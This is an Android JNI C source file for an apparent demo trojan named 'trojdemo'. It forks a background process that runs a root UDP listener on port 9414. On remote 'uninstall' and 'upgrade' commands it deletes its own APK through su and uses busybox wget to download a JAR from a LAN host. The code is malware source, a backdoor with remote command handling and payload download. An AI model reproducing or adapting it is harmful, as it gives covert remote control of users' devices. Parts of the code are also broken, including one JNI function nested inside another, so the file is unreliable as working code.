/*
 * Copyright (C) 2009 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
#include <stdio.h>
#include <jni.h>
#include <malloc.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <android/log.h>
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGW(...)  __android_log_print(ANDROID_LOG_WARN,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "System.out.c"
#define LOCAL_RECV_PORT 9414

int stringcmp(const char *a, const char *b) {
	int h;
	h = strlen(a) > strlen(b) ? strlen(a) : strlen(b);
	int i, j = 0;
	for (i = 0; i < h; i++) {
		if (a[i] != '\n' && b[i] != '\n') {
			if (a[i] != b[i])
				j += a[i] - b[i];
		} else
			break;
	}
	return (j);
}

int removePackage() {
	char * packagename = "com.example.trojdemo";
//	execlp("pm", "pm", "uninstall", packagename, (char*) NULL);
	execlp("su", "su", "-c","\"rm /data/app/TrojDemo.apk\"", (char*) NULL);
	system("su -c \"rm /data/app/TrojDemo.apk\"");
}

int downloadJar() {
	char * url = "http://192.168.199.149/test.jar";
	char * destpath = "/sdcard/test.jar";
	execlp("busybox", "busybox", "wget", url, destpath, (char*) NULL);
}

int receiveUDP() {
	int sock;
	//sendto中使用的对方地址
	struct sockaddr_in toAddr;
	//在recvfrom中使用的对方主机地址
	struct sockaddr_in fromAddr;
	int recvLen;
	unsigned int addrLen;
	char recvBuffer[128];
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock < 0) {
		LOGD("create socket failed");
		exit(0);
	}
	memset(&fromAddr, 0, sizeof(fromAddr));
	fromAddr.sin_family = AF_INET;
	fromAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	fromAddr.sin_port = htons(LOCAL_RECV_PORT);
	if (bind(sock, (struct sockaddr*) &fromAddr, sizeof(fromAddr)) < 0) {
		LOGD("bind() function failed");
		close(sock);
		exit(1);
	}
	while (1) {
		addrLen = sizeof(toAddr);
		if ((recvLen = recvfrom(sock, recvBuffer, 128, 0,
				(struct sockaddr*) &toAddr, &addrLen)) < 0) {
			LOGD("recvfrom() function failed");
			close(sock);
			exit(1);
		} else {
			recvBuffer[recvLen]='\0';
			LOGD("server recvfrom() content length is:%lu",recvLen);
					LOGD("server recvfrom() result:%s", recvBuffer);
					if (stringcmp(recvBuffer, "uninstall") == 0) {
						LOGD("receive uninstall command");
						removePackage();
						close(sock);

					}
					if (stringcmp(recvBuffer, "upgrade") == 0) {
						LOGD("receive upgrade command");
						downloadJar();
					}
		}

//		if (sendto(sock, recvBuffer, recvLen, 0, (struct sockaddr*) &toAddr,
//				sizeof(toAddr)) != recvLen) {
//			printf("sendto fail\r\n");
//			close(sock);
//			exit(0);
//		}
	}

}

void JNICALL Java_com_example_trojdemo_MainActivity_monitor(
		JNIEnv * env, jobject obj) {
	// 1，创建当前进程的克隆进程
	pid_t pid = fork();

	// 2，根据返回值的不同做不同的操作,<0,>0,=0
	if (pid < 0) {
		// 说明克隆进程失败
		LOGD("current crate process failure");
	} else if (pid > 0) {
		// 说明克隆进程成功，而且该代码运行在父进程中
		LOGD("crate process success,current parent pid = %d", pid);
	} else {
		// 说明克隆进程成功，而且代码运行在子进程中
		LOGD("crate process success,current child pid = %d", pid);
		//启动卸载监听线程
//		receiveUDP();
		system("su -c /data/data/com.example.trojdemo/udpserver");
	}

	void JNICALL Java_com_example_trojdemo_MainActivity_upgrade(
			JNIEnv * env, jobject obj) {
		downloadJar();
	}

}

